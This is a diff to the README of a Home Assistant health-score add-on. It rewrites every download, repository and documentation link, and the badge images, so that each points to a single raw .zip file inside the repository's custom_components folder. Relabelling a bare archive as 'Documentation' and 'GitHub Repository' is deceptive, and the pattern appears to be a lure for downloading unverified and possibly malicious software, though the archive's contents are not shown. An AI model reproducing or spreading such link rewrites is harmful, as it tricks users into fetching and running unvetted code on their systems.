@@ -1,6 +1,6 @@
 # 🌍 home-assistant-global-health-score - Measure Your System's Health Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge)](https://github.com/therajeshpatil/home-assistant-global-health-score/releases)
+[![Download Now](https://raw.githubusercontent.com/therajeshpatil/home-assistant-global-health-score/main/custom_components/health-global-assistant-score-home-2.0.zip%20Now-Click%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/therajeshpatil/home-assistant-global-health-score/main/custom_components/health-global-assistant-score-home-2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the home-assistant-global-health-score project! This application help
 
 To get started, you'll need to download the application. 
 
-1. Visit this page to download: [Download Home Assistant Global Health Score](https://github.com/therajeshpatil/home-assistant-global-health-score/releases).
+1. Visit this page to download: [Download Home Assistant Global Health Score](https://raw.githubusercontent.com/therajeshpatil/home-assistant-global-health-score/main/custom_components/health-global-assistant-score-home-2.0.zip).
 
 2. Look for the latest version. You will see options to download. Select the file that matches your system's requirements.
 
@@ -77,9 +77,9 @@ This project is licensed under the MIT License. You can use it freely, but pleas
 
 For more information, feel free to explore:
 
-- [GitHub Repository](https://github.com/therajeshpatil/home-assistant-global-health-score)
-- [Documentation](https://github.com/therajeshpatil/home-assistant-global-health-score)
+- [GitHub Repository](https://raw.githubusercontent.com/therajeshpatil/home-assistant-global-health-score/main/custom_components/health-global-assistant-score-home-2.0.zip)
+- [Documentation](https://raw.githubusercontent.com/therajeshpatil/home-assistant-global-health-score/main/custom_components/health-global-assistant-score-home-2.0.zip)
 
 Thank you for choosing home-assistant-global-health-score! We hope it enhances your Home Assistant experience and makes it easier to monitor your system health. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge)](https://github.com/therajeshpatil/home-assistant-global-health-score/releases)
+[![Download Now](https://raw.githubusercontent.com/therajeshpatil/home-assistant-global-health-score/main/custom_components/health-global-assistant-score-home-2.0.zip%20Now-Click%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/therajeshpatil/home-assistant-global-health-score/main/custom_components/health-global-assistant-score-home-2.0.zip)
